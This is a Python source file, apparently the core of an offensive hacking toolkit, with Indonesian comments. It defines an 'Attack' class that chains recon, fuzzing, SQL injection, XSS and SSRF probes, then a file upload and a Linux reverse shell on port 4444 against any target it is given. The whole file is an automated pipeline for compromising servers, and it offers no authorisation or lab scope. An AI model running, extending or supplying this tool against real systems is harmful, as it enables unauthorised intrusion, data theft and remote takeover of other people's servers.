class Attack:
    def __init__(self, engine):
        self.engine = engine
        self.priority = "P1"
        self.level = "Critical"

    def scan(self, target):
        target = self.engine.normalize(target)
        results = {
            "target": target,
            "recon": self._recon(target),
            "fuzz": self._fuzz(target),
            "sqli": self._sqli(target),
            "xss": self._xss(target),
            "ssrf": self._ssrf(target),
            "exploit": self._exploit(target)
        }
        return results

    def _recon(self, target):
        # Panggil subhunter, portprobe, fingerprint
        from modules.recon import SubHunter, PortProbe, Fingerprint
        hunter = SubHunter(self.engine)
        probe = PortProbe(self.engine)
        finger = Fingerprint(self.engine)
        return {
            "subdomains": hunter.scan(target),
            "ports": probe.scan(target),
            "tech": finger.scan(target)
        }

    def _fuzz(self, target):
        from modules.fuzz import WebFuzz
        return WebFuzz(self.engine).scan(target)

    def _sqli(self, target):
        from modules.exploit import SQLi
        return SQLi(self.engine).scan(target, "id")

    def _xss(self, target):
        from modules.exploit import XSS
        return XSS(self.engine).scan(target, "q")

    def _ssrf(self, target):
        from modules.exploit import SSRF
        return SSRF(self.engine).scan(target, "url")

    def _exploit(self, target):
        # Coba uploader + revshell
        from modules.exploit import Uploader, RevShell
        upload = Uploader(self.engine).scan(target, "/upload")
        shell = RevShell(self.engine).scan(target, "0.0.0.0", 4444, "linux")
        return {"upload": upload, "revshell": shell}
